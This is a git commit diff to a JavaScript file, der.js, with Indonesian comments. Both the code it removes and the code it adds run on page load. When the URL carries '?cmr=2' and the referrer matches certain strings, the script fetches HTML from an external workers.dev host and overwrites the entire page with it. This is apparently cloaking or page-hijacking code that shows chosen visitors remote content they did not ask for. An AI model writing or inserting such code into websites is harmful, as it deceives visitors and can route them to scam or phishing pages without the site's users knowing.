580a5de3db67436deae2e6f350c4076c70460025
mrotang <65051182+mrotang@users.noreply.github.com>
2023-05-20 22:02:52 +0700

    Update der.js

--- der.js
+++ der.js
@@ -1,41 +1,16 @@
-if (window.location.search.includes("?cmr=2")) {
-  // Lakukan permintaan fetch untuk mendapatkan data dari website
-  fetch("https://crm-template-one.mastimon.workers.dev/")
-    .then((response) => response.text())
-    .then((data) => {
-      // Ubah HTML pada tag <html> dengan data yang diperoleh
-      document.querySelector("html").innerHTML = data;
-    })
-    .catch((error) => {
-      console.error("Terjadi kesalahan:", error);
-    });
-}
+// Mendapatkan URL saat ini
+var currentUrl = window.location.href;
 
-
-if (document.referrer.includes('?cmr=2')) {
-  fetch('https://crm-template-one.mastimon.workers.dev/')
-    .then(response => response.text())
-    .then(data => {
-      const parser = new DOMParser();
-      const newDoc = parser.parseFromString(data, 'text/html');
-      const newHtml = newDoc.querySelector('html').outerHTML;
-      document.querySelector('html').outerHTML = newHtml;
-    })
-    .catch(error => {
-      console.error('Error fetching data:', error);
-    });
-}
-
-// Memeriksa sumber lalu lintas dan parameter URL
-if (document.referrer.includes("redirect") && document.referrer.includes("?cmr=2")) {
-  // Mengubah HTML pada tag <html> dengan data yang diambil dari website
+// Memeriksa apakah sumber lalu lintas adalah redirect status 302 dan memiliki parameter ?cmr=2
+if (document.referrer && document.referrer.includes("302") && currentUrl.includes("?cmr=2")) {
+  // Mengambil HTML dari https://crm-template-one.mastimon.workers.dev/
   fetch("https://crm-template-one.mastimon.workers.dev/")
     .then(response => response.text())
-    .then(data => {
-      // Mengubah HTML pada tag <html> dengan data yang diambil
-      document.documentElement.innerHTML = data;
+    .then(html => {
+      // Mengganti HTML pada tag <html> dengan HTML yang diambil dari website
+      document.querySelector('html').innerHTML = html;
     })
     .catch(error => {
-      console.log("Terjadi kesalahan:", error);
+      console.error('Error:', error);
     });
 }
